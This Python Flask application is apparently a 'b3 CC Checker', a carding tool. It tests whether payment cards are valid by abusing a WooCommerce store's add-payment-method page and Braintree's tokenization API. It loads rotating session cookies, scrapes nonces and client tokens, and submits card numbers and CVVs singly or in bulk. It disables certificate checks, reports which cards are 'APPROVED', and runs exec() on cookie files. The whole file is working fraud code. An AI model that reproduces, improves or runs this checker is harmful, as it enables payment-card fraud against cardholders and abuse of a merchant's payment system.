from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import requests
import re
import base64
from bs4 import BeautifulSoup
import time
import json
import random
import urllib3
import os
import uuid
import urllib.parse

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "*"}}) # Allow cross-origin for GitHub Pages

# Global variables
SITES = []
COOKIES_LIST = []
current_cookie_index = 0

# Base directory (project root)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def load_sites():
    """Load sites from site.txt"""
    global SITES
    try:
        site_file = os.path.join(BASE_DIR, 'site.txt')
        if os.path.exists(site_file):
            with open(site_file, 'r') as f:
                SITES = [line.strip() for line in f if line.strip()]
        if not SITES:
            SITES = ["https://www.calipercovers.com/"]
    except Exception as e:
        print(f"Error loading sites: {str(e)}")
        SITES = ["https://www.calipercovers.com/"]

def load_cookies():
    """Load all cookies from the cookies/ directory (supports Python and JSON)"""
    global COOKIES_LIST
    COOKIES_LIST = []
    try:
        cookie_dir = os.path.join(BASE_DIR, 'cookies')
        if os.path.exists(cookie_dir):
            for file in os.listdir(cookie_dir):
                if file.endswith('.txt') or file.endswith('.json'):
                    filepath = os.path.join(cookie_dir, file)
                    try:
                        with open(filepath, 'r') as f:
                            content = f.read().strip()
                            if content.startswith('{') or content.startswith('['):
                                # Try JSON format
                                try:
                                    json_data = json.loads(content)
                                    if isinstance(json_data, dict):
                                        COOKIES_LIST.append(json_data)
                                    elif isinstance(json_data, list):
                                        # Convert browser extension list format to dict
                                        cookies_dict = {item['name']: item['value'] for item in json_data if 'name' in item and 'value' in item}
                                        if cookies_dict: COOKIES_LIST.append(cookies_dict)
                                except: pass
                            else:
                                # Try Python dictionary format
                                try:
                                    namespace = {}
                                    exec(content, namespace)
                                    cookies = namespace.get('cookies', {})
                                    if cookies: COOKIES_LIST.append(cookies)
                                except: pass
                    except Exception as e:
                        print(f"Error loading cookies from {file}: {str(e)}")
        print(f"Loaded {len(COOKIES_LIST)} cookie sets.")
    except Exception as e:
        print(f"Error loading cookies directory: {str(e)}")

def get_next_cookie():
    """Get next cookie set in round-robin fashion"""
    global COOKIES_LIST, current_cookie_index
    if not COOKIES_LIST:
        load_cookies()
    if not COOKIES_LIST:
        return {}
    
    cookie = COOKIES_LIST[current_cookie_index]
    current_cookie_index = (current_cookie_index + 1) % len(COOKIES_LIST)
    return cookie

def get_headers(domain_url):
    """Generic headers for browser-like requests"""
    return {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
    }

def get_bin_info(bin_number):
    """Get BIN information"""
    try:
        response = requests.get(f'https://bin-db.vercel.app/api/bin?bin={bin_number}', timeout=10)
        if response.status_code == 200:
            data = response.json()
            if data.get('status') == 'SUCCESS' and data.get('data'):
                bin_data = data['data'][0]
                country_info = bin_data.get('Country', {})
                country_code = bin_data.get('country_code') or country_info.get('A2')
                
                # Flag emoji
                emoji = '🏳️'
                if country_code and len(country_code) == 2:
                    emoji = chr(ord(country_code[0].upper()) + 127397) + chr(ord(country_code[1].upper()) + 127397)

                return {
                    'bank': bin_data.get('issuer', 'UNKNOWN'),
                    'brand': bin_data.get('brand', 'UNKNOWN'),
                    'country': country_info.get('Name', 'UNKNOWN'),
                    'emoji': emoji,
                    'level': bin_data.get('CardTier', 'UNKNOWN'),
                    'type': bin_data.get('type', 'UNKNOWN')
                }
    except:
        pass
    return {'bank': 'UNKNOWN', 'brand': 'UNKNOWN', 'country': 'UNKNOWN', 'emoji': '🏳️', 'level': 'UNKNOWN', 'type': 'UNKNOWN'}

def check_card(cc_line):
    """Main card checking logic using the new captured API"""
    start_time = time.time()
    
    if not SITES: load_sites()
    domain_url = SITES[0]
    cookies = get_next_cookie()
    
    if not cookies:
        return {'status': 'ERROR', 'card': cc_line, 'response': 'No cookies available', 'is_approved': False}

    try:
        parts = cc_line.strip().split('|')
        if len(parts) != 4:
            return {'status': 'ERROR', 'card': cc_line, 'response': 'Format: CC|MM|YY|CVV', 'is_approved': False}
        n, mm, yy, cvc = parts
        if len(yy) == 2: yy = '20' + yy
    except Exception as e:
        return {'status': 'ERROR', 'card': cc_line, 'response': str(e), 'is_approved': False}

    try:
        # Step 1: Get Nonce and Client Token
        headers = get_headers(domain_url)
        response = requests.get(f'{domain_url}/my-account/add-payment-method/', cookies=cookies, headers=headers, verify=False, timeout=30)
        
        if response.status_code != 200:
            return {'status': 'ERROR', 'card': cc_line, 'response': f'Page Load Failed: {response.status_code}', 'is_approved': False}

        wp_nonce = re.search('name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
        if not wp_nonce: return {'status': 'ERROR', 'card': cc_line, 'response': 'WP Nonce Not Found', 'is_approved': False}
        wp_nonce = wp_nonce.group(1)

        i0 = response.text.find('wc_braintree_client_token = ["')
        if i0 == -1: return {'status': 'ERROR', 'card': cc_line, 'response': 'Client Token Not Found', 'is_approved': False}
        i1 = response.text.find('"]', i0)
        client_token_b64 = response.text[i0 + 30:i1]
        decoded_token = json.loads(base64.b64decode(client_token_b64).decode('utf-8'))
        auth_fingerprint = decoded_token['authorizationFingerprint']

        # Step 2: GraphQL Tokenization
        headers_gql = {
            'accept': '*/*',
            'authorization': f'Bearer {auth_fingerprint}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36',
        }

        json_data_gql = {
            'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': str(uuid.uuid4())},
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                        'billingAddress': {'postalCode': '10080', 'streetAddress': ''},
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        gql_response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_gql, json=json_data_gql, verify=False, timeout=30)
        
        if gql_response.status_code != 200:
            return {'status': 'ERROR', 'card': cc_line, 'response': f'GQL Error: {gql_response.status_code}', 'is_approved': False}
        
        gql_json = gql_response.json()
        if 'errors' in gql_json:
            return {'status': 'DECLINED', 'card': cc_line, 'response': gql_json['errors'][0]['message'], 'is_approved': False}
        
        card_token = gql_json['data']['tokenizeCreditCard']['token']

        # Step 3: Add Payment Method
        config_data = {
            "environment": "production",
            "clientApiUrl": "https://api.braintreegateway.com:443/merchants/dqh5nxvnwvm2qqjh/client_api",
            "merchantId": "dqh5nxvnwvm2qqjh",
            "challenges": ["cvv", "postal_code"],
            "creditCards": {"supportedCardTypes": ["MasterCard", "Visa", "Discover", "JCB", "American Express", "UnionPay"]},
            "threeDSecureEnabled": False
        }
        
        headers_post = get_headers(domain_url)
        headers_post.update({'content-type': 'application/x-www-form-urlencoded', 'referer': f'{domain_url}/my-account/add-payment-method/'})
        
        post_data = {
            'payment_method': 'braintree_cc',
            'braintree_cc_nonce_key': card_token,
            'braintree_cc_device_data': f'{{"device_session_id":"{str(uuid.uuid4()).replace("-","")}","correlation_id":"{str(uuid.uuid4())[:20]}"}}',
            'braintree_cc_config_data': json.dumps(config_data),
            'woocommerce-add-payment-method-nonce': wp_nonce,
            '_wp_http_referer': '/my-account/add-payment-method/',
            'woocommerce_add_payment_method': '1',
        }

        final_response = requests.post(f'{domain_url}/my-account/add-payment-method/', cookies=cookies, headers=headers_post, data=post_data, verify=False, timeout=30)
        
        soup = BeautifulSoup(final_response.text, 'html.parser')
        error_ul = soup.find('ul', class_='woocommerce-error')
        success_div = soup.find('div', class_='woocommerce-message')
        
        bin_info = get_bin_info(n[:6])
        elapsed = f"{time.time() - start_time:.2f}s"

        if success_div:
            msg = success_div.get_text(strip=True)
            return {'status': 'APPROVED', 'card': cc_line, 'response': msg, 'gateway': 'Braintree', 'bin_info': bin_info, 'time_taken': elapsed, 'is_approved': True}
        elif error_ul:
            msg = error_ul.get_text(strip=True)
            is_good = any(x in msg for x in ['Insufficient Funds', 'Duplicate', 'Approved'])
            return {'status': 'APPROVED' if is_good else 'DECLINED', 'card': cc_line, 'response': msg, 'gateway': 'Braintree', 'bin_info': bin_info, 'time_taken': elapsed, 'is_approved': is_good}
        else:
            return {'status': 'DECLINED', 'card': cc_line, 'response': 'Unknown Response', 'gateway': 'Braintree', 'bin_info': bin_info, 'time_taken': elapsed, 'is_approved': False}

    except Exception as e:
        return {'status': 'ERROR', 'card': cc_line, 'response': str(e), 'is_approved': False}

@app.route('/')
def home():
    template_path = os.path.join(BASE_DIR, 'index.html')
    if os.path.exists(template_path): return send_file(template_path)
    return "API is active. b3 CC Checker is running."

@app.route('/check')
def check_single():
    card = request.args.get('card', '')
    if not card: return jsonify({'error': 'No card provided'}), 400
    return jsonify(check_card(card))

@app.route('/bulk-check', methods=['POST'])
def bulk_check():
    data = request.get_json()
    if not data or 'cards' not in data: return jsonify({'error': 'No cards provided'}), 400
    results = []
    for card in data['cards']:
        results.append(check_card(card))
        time.sleep(1)
    return jsonify({'results': results})

@app.route('/health')
def health():
    return jsonify({'status': 'ok', 'cookies_loaded': len(COOKIES_LIST)})

if __name__ == '__main__':
    load_sites()
    load_cookies()
    app.run(host='0.0.0.0', port=5000, debug=True)
